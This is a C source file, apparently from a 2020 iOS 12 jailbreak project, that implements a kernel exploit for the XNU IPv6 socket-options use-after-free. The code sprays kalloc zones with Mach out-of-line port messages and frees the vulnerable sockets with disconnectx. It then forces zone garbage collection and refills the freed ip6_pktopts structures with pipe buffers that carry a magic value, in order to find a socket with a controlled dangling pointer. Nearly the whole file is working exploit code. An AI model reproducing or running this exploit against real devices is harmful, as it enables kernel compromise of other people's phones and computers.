//
//  exploit.c
//  se12.0exploit
//
//  Created by Justin Sherman on 1/13/20.
//  Copyright Â© 2020 Justin Sherman. All rights reserved.
//

#include <CoreFoundation/CoreFoundation.h>
#include <errno.h>
#include <pthread/pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "exploit.h"

#define CHECK_ERROR(err, errmsg, ...) \
    do { \
        if((err)){ \
            printf(errmsg, ##__VA_ARGS__); \
            return 1; \
        } \
    } while (0)

static const uint32_t MINMTU_MAGIC = 0xcafe;
static const uint32_t MINMTU_MAGIC_MASK = 0xffff0000;
static const uint32_t MINMTU_PIPEIDX_MASK = 0x0000ffff;

#define MAGIC_FROM_MINMTU(minmtu) (((minmtu) & MINMTU_MAGIC_MASK) >> 16)
#define PIPEIDX_FROM_MINMTU(minmtu) ((minmtu) & MINMTU_PIPEIDX_MASK)

/* static vm_size_t PAGESIZE = 0; */

static const char *HOSTNAME = NULL;

static void my_mach_zone_force_gc(int kalloc_zone, int free_msgs){
    mach_port_t recv_port;
    kern_return_t kret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv_port);

    if(kret){
        printf("%s: mach_port_allocate %s\n", __func__, mach_error_string(kret));
    }
    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_port_desc;
    };

    /* int kalloc_zone = 32768; */

    /* in the kernel, each port will be an 8 byte pointer, purpose of this
     * is to make the largest allocation we can for a given zone
     */
    int port_count = kalloc_zone / 8;
    /* calloc for MACH_PORT_NULL */
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));

    struct ool_msg *oolmsg = malloc(sizeof(struct ool_msg));
    oolmsg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg->hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg->hdr.msgh_remote_port = recv_port;
    oolmsg->hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg->hdr.msgh_id = 0xaabbccdd;
    oolmsg->body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg->ool_port_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    /* shoving 16mb into kalloc.32768 works really well */
    int msgcount = 512;

    for(int i=0; i<msgcount; i++){
        kret = mach_msg(&oolmsg->hdr, MACH_SEND_MSG, sizeof(*oolmsg), 0,
                MACH_PORT_NULL, 0, MACH_PORT_NULL);
        if(kret){
            printf("%s: mach_msg %s\n", __func__, mach_error_string(kret));
        }
    }

    free(oolmsg);
    free(ports);

    if(free_msgs)
        mach_port_destroy(mach_task_self(), recv_port);
}

static mach_port_t kalloc(int len){
    mach_port_t recv_port;
    kern_return_t kret = mach_port_allocate(mach_task_self(),
            MACH_PORT_RIGHT_RECEIVE, &recv_port);
    if(kret){
        /* printf("%s: mach_port_allocate %s\n", __func__, mach_error_string(kret)); */
        return MACH_PORT_NULL;
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_port_desc;
    };

    int port_count = len / 8;
    /* calloc for MACH_PORT_NULL */
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));

    struct ool_msg *oolmsg = malloc(sizeof(struct ool_msg));
    oolmsg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg->hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg->hdr.msgh_remote_port = recv_port;
    oolmsg->hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg->hdr.msgh_id = 0xaabbccdd;
    oolmsg->body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg->ool_port_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kret = mach_msg(&oolmsg->hdr, MACH_SEND_MSG, sizeof(*oolmsg), 0,
            MACH_PORT_NULL, 0, MACH_PORT_NULL);

    free(oolmsg);
    free(ports);

    if(kret){
        /* printf("%s: mach_msg kret %s\n", __func__, mach_error_string(kret)); */
        return MACH_PORT_NULL;
    }

    return recv_port;
}

static void my_mach_zone_force_gc2(void){
    mach_timebase_info_data_t info = {0};
    mach_timebase_info(&info);

    static const int kalloc_zones[] = {
        /* 8, */
        /* 16,	24, */
        /* 32,	40,	48, */
        /* 64,	72,	88,	112, */
        /* 128,	192, */
        256,	288,	384,	440,
         512,	576, 	768, 
        1024,	1152,	1536,
        2048,	2128, 	3072,
        4096,	6144, 8192, 16384, 32768
    };

    int num_zones = sizeof(kalloc_zones) / sizeof(*kalloc_zones);

    int hundredMB = 1048576 * 100;
    uint64_t maxtime = 0;

    for(int i=0; i<num_zones; i++){
        printf("%s: zone %d\n", __func__, kalloc_zones[i]);
        uint32_t allocs_for_hundredMB = hundredMB / kalloc_zones[i];
        uint32_t curzone = kalloc_zones[i];
        /* printf("%s: allocs_for_hundredMB: %#x\n", __func__, allocs_for_hundredMB); */
        /* mach_port_t *p = calloc(sizeof(mach_port_t), allocs_for_hundredMB); */
        mach_port_t *p = malloc(sizeof(mach_port_t) * allocs_for_hundredMB);
        for(int k=0; k<allocs_for_hundredMB; k++)
            p[k] = MACH_PORT_NULL;

        uint64_t start = mach_absolute_time();

        int numallocs = 0;
        for(uint32_t k=0; k<allocs_for_hundredMB; k++){
            /* printf("k %d\n", k); */
            mach_port_t r = kalloc(curzone);
            if(r != MACH_PORT_NULL){
                numallocs++;
                p[k] = r;
            }
        }
        /* printf("here\n"); */

        /* for(int k=0; k<allocs_for_hundredMB; k++){ */
        /*     if(p[k] != MACH_PORT_NULL) */
        /*         mach_port_destroy(mach_task_self(), p[k]); */
        /* } */

        uint64_t end = mach_absolute_time();

        free(p);

        uint64_t time = end - start;

        printf("%s: zone %d: time %lld numallocs %d\n", __func__,
                curzone, time, numallocs);
        return;

        /* if(time > maxtime){ */
        /*     maxtime = time; */
        /*     printf("%s: got new maxtime %#lld\n", __func__, time); */
        /* } */
    }
}

static int create_vulnerable_socket(void){
    int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

    if(s == -1){
        printf("error creating socket: %s\n", strerror(errno));
        return -1;
    }

    struct so_np_extensions ex = {
        .npx_flags = SONPX_SETOPTSHUT,
        .npx_mask = SONPX_SETOPTSHUT
    };
    
    int err = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &ex, sizeof(ex));

    if(err == -1){
        printf("first setsockopt: %s\n", strerror(errno));
        return -1;
    }

    int minmtu = IP6PO_MINMTU_ALL;
    err = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));

    if(err == -1){
        printf("second setsockopt: %s\n", strerror(errno));
        return -1;
    }

    return s;
}

static int get_minmtu(int socket, int *minmtu){
    socklen_t minmtu_sz = sizeof(*minmtu);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &minmtu_sz);
}

static int increase_file_limit(void){
    struct rlimit rl = {0};

    int err = getrlimit(RLIMIT_NOFILE, &rl);

    if(err){
        printf("%s: getrlimit: %s\n", __func__, strerror(errno));
        return err;
    }

    rl.rlim_cur = OPEN_MAX;
    rl.rlim_max = rl.rlim_cur;

    err = setrlimit(RLIMIT_NOFILE, &rl);

    if(err){
        printf("%s: setrlimit: %s\n", __func__, strerror(errno));
        return err;
    }

    return 0;
}

extern kern_return_t mach_zone_force_gc(host_t host);

static void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

static void _cleanup(int **pipes, int num_pipes, int *sockets,
        int num_sockets){
        /* mach_port_t **placeholders_before, */
        /* int num_place_holders_before, mach_port_t **placeholders_after, */
        /* int num_place_holders_after){ */
    for(int i=0; i<num_pipes; i++){
            close(*pipes[i]);
            close(*(pipes[i] + 1));
            free(pipes[i]);
    }

    for(int i=0; i<num_sockets; i++)
        close(sockets[i]);

    return;
    /* for(int i=0; i<num_sockets-1; i++){ */
    /*     for(int k=0; k<num_place_holders_before; k++){ */
    /*         mach_port_destroy(mach_task_self(), placeholders_before[i][k]); */
    /*     } */
    /* } */

    /* for(int i=0; i<num_sockets-1; i++){ */
    /*     for(int k=0; k<num_place_holders_after; k++){ */
    /*         mach_port_destroy(mach_task_self(), placeholders_after[i][k]); */
    /*     } */
    /* } */
}

/* #define CLEANUP _cleanup(pipes, num_pipes, sockets, num_sockets, \ */
/*         placeholders_before, num_placeholders_before, placeholders_after, \ */
/*         num_placeholders_after) */

#define CLEANUP _cleanup(pipes, num_pipes, sockets, num_sockets)

int exploit(mach_port_t *tfp0out){
    vm_size_t pagesize;
    _host_page_size(mach_host_self(), &pagesize);

    increase_file_limit();

    printf("sizeof(struct ip6_pktopts) = %#x\n", sizeof(struct ip6_pktopts));
    struct utsname u = {0};
    uname(&u);

    printf("%s %s %s %s %s\n", u.sysname, u.nodename, u.release, u.version,
            u.machine);

    HOSTNAME = u.nodename;

    size_t sz = sizeof(struct ip6_pktopts);
    if(sz == 0xb0 && strcmp(HOSTNAME, "pink") == 0){
        printf("UNCOMMENT ro_lle IN THE route_in6 STRUCT\n");
        return 1;
    }
    else if(sz == 0xc0 && strcmp(HOSTNAME, "blue") == 0){
        printf("COMMENT OUT ro_lle IN THE route_in6 STRUCT\n");
        return 1;
    }

    int num_pipes = 3100;
    int *pipes[num_pipes];

    for(int i=0; i<num_pipes; i++)
        pipes[i] = malloc(sizeof(int) * 2);

    printf("Making controlled allocations in kalloc.192...\n");

    int num_sockets = 4000;
    int sockets[num_sockets];
    for(int i=0; i<num_sockets; i++)
        sockets[i] = -1;

    int needs_show_msg = 0;
    int already_shown = 0;
    int last_prealloc = 0;

    int num_preallocs = num_sockets*2;
    int prealloc_times_per_loop = 50;
    mach_port_t *preallocs = malloc(sizeof(mach_port_t) * 500000);

    for(int i=0; i<num_sockets; i++){
        /* this will initialize inp_depend6.inp6_outputopts for this socket */
        /* kalloc.192 allocation */
        int s = create_vulnerable_socket();

        if(s == -1){
            printf("Could not create socket %d\n", i);
            return 1;
        }

        sockets[i] = s;
    }

    // XXX 384 MB
    int zone_map_sz = 402653184;
    /* page size allocations, so we know these free pages will get
     * sent back to the zone allocator
     */
    int kzone = pagesize;
    int num_kallocs = (zone_map_sz * .90) / kzone;

    printf("Making %d kalloc.%d allocations to free later...\n",
            num_kallocs, kzone);

    for(int i=0; i<num_kallocs; i++){
        mach_port_t p = kalloc(kzone);

        if(p == MACH_PORT_NULL){
            needs_show_msg = 1;
        }
        else{
            preallocs[i] = p;

        }

        if(needs_show_msg && !already_shown){
            printf("Ran out of kalloc.%d mem at %d\n", i, kzone);
            already_shown = 1;
            last_prealloc = i;
            break;
        }
    }

    printf("Freeing the kalloc.192 allocations...\n");

    for(int i=0; i<num_sockets; i++){
        disconnectx(sockets[i], 0, 0);
    }

    printf("Freeing the kalloc.%d allocations...\n", kzone);

    for(int i=0; i<last_prealloc; i++){
        mach_port_destroy(mach_task_self(), preallocs[i]);
    }

    free(preallocs);
    preallocs = NULL;

    /* mach_zone_force_gc(mach_host_self()); */

    int gc_kalloc_zone = pagesize;
    int num_gc_kallocs = (zone_map_sz * .6) / gc_kalloc_zone;
    printf("%d kalloc.%d allocations to try and trigger garbage collection\n",
            num_gc_kallocs, gc_kalloc_zone);
    int gc_brk = 0;
    mach_port_t *gc_ports = malloc(sizeof(mach_port_t) * num_gc_kallocs);
    uint64_t maxtime = 0;
    for(int i=0; i<num_gc_kallocs; i++){
        uint64_t start = mach_absolute_time();
        mach_port_t p = kalloc(gc_kalloc_zone);
        uint64_t end = mach_absolute_time();
        if(p == MACH_PORT_NULL){
            printf("Final kalloc.%d spray: no space @ %d, gc should trigger\n", 
                    gc_kalloc_zone, i);
            break;
        }
        gc_ports[i] = p;
        uint64_t time = end - start;

        if(time > maxtime){
            maxtime = time;
            printf("new maxtime %lld @ %d\n", maxtime, i);
        }
        
        if(time > 100000){
            printf("Maybe gc at %d\n", i);
            gc_brk = i;
            break;
        }
    }

    /* if(gc_brk == 0){ */
    /*     printf("no gc?\n"); */
    /* } */

    int num_gcports = gc_brk != 0 ? gc_brk : num_gc_kallocs;

    for(int i=0; i<num_gcports; i++)
        mach_port_destroy(mach_task_self(), gc_ports[i]);

    free(gc_ports);
    gc_ports = NULL;

    /* my_mach_zone_force_gc(16384, 1); */
    /* my_mach_zone_force_gc(32768, 0); */
    /* my_mach_zone_force_gc(32768, 1); */
    /* my_mach_zone_force_gc(32768, 1); */
    /* my_mach_zone_force_gc(32768, 1); */
    /* my_mach_zone_force_gc(32768, 1); */
    /* my_mach_zone_force_gc(32768, 1); */
    /* my_mach_zone_force_gc(32768, 1); */
    /* my_mach_zone_force_gc(32768, 1); */
    /* my_mach_zone_force_gc2(); */
    /* sleep(1); */
    /* usleep(100000); */

    /* create a bunch of kalloc.512 pipe buffers, if all went well,
     * several of our pipe buffers should overlap with the dangling
     * ip6_pktopts structs
     */
    struct ip6_pktopts pipe_spray_opts = {0};
    // XXX note: means nothing, just for fun
    /* pipe_spray_opts.ip6po_pktinfo = 0xfffffff017004000; */

    for(int i=0; i<num_pipes; i++){
        if(pipe(pipes[i])){
            printf("create pipe %d: %s\n", i, strerror(errno));
            CLEANUP;
            return 1;
        }

        pipe_spray_opts.ip6po_minmtu = (MINMTU_MAGIC << 16) | i;
        
        ssize_t w = write(*(pipes[i] + 1), &pipe_spray_opts, sizeof(pipe_spray_opts));

        /* go slow, we didn't wait for a possible gc to finish earlier */
        pthread_yield_np();
        usleep(100);

        /* if(i%1000==0) */
        /*     printf("%d\n", i); */

        if(w == -1){
            printf("write to pipe %d: %s\n", i, strerror(errno));
            CLEANUP;
            return 1;
        }
    }

    int evil_socket = -1;
    int *evil_pipe = NULL;

    int FIND_EVIL_SOCKET_DEBUG = 1;
    int FIND_EVIL_SOCKET_DEBUG_LEVEL1 = 0;

    int zero_minmtus = 0;

    for(int i=0; i<num_sockets; i++){
        uint32_t minmtu = 0;
        if(get_minmtu(sockets[i], &minmtu))
            continue;

        uint32_t minmtu_magic = MAGIC_FROM_MINMTU(minmtu);

        if(minmtu_magic == MINMTU_MAGIC){
            evil_socket = sockets[i];
            
            uint32_t possible_evil_pipe = PIPEIDX_FROM_MINMTU(minmtu);

            if(possible_evil_pipe > num_pipes){
                printf("pipe idx (%d) > num_pipes (%d)????\n",
                        possible_evil_pipe, num_pipes);
                CLEANUP;
                return 1;
            }

            evil_pipe = pipes[possible_evil_pipe];
            break;
        }
        // XXX IP6PO_MINMTU_ALL was initial value, 0xdeadbeef is spammed sometimes
        else if(minmtu != IP6PO_MINMTU_ALL && minmtu != 0xdeadbeef){
            if(FIND_EVIL_SOCKET_DEBUG){
                if(minmtu != 0){
                    if(FIND_EVIL_SOCKET_DEBUG_LEVEL1){
                        printf("socket %d minmtu %#x minmtu_magic %#x\n", i, minmtu,
                                minmtu_magic);
                    }
                }
                else{
                    zero_minmtus++;
                }
            }
        }
    }

    if(FIND_EVIL_SOCKET_DEBUG_LEVEL1){
        printf("An additional %d ip6_pktopts struct(s) got reallocated, but"
                " had minmtu == 0 (output suppressed)\n", zero_minmtus);
    }

    if(evil_socket == -1){
        printf("Couldn't reallocate a controlled ip6_pktopts struct in kalloc.512\n");
        CLEANUP;
        return 1;
    }

    int minmtu = 0;
    if(get_minmtu(evil_socket, &minmtu)){
        printf("Couldn't read minmtu from evil_socket? %s\n", strerror(errno));
        CLEANUP;
        return 1;
    }

    printf("Got a controlled ip6_pktopts struct in kalloc.512, minmtu: %#x\n", minmtu);
    printf("Evil socket: %d\n", evil_socket);

    struct in6_pktinfo info = {0};
    socklen_t infosz = sizeof(info);

    int err = getsockopt(evil_socket, IPPROTO_IPV6, IPV6_PKTINFO, &info, &infosz);

    if(err == -1){
        /* printf("getsockopt with IPV6_PKTINFO: %s\n", strerror(errno)); */
        /* CLEANUP; */
        /* return 1; */
    }
    else{
        printf("getsockopt with IPV6_PKTINFO passed\n");
        DumpHex(&info, sizeof(info));
    }

    for(int i=0; i<num_pipes; i++){
        if(pipes[i] != evil_pipe){
            close(*pipes[i]);
            close(*(pipes[i] + 1));
            free(pipes[i]);
        }
    }

    for(int i=0; i<num_sockets; i++){
        if(sockets[i] != evil_socket)
            close(sockets[i]);
    }

    return 0;
}
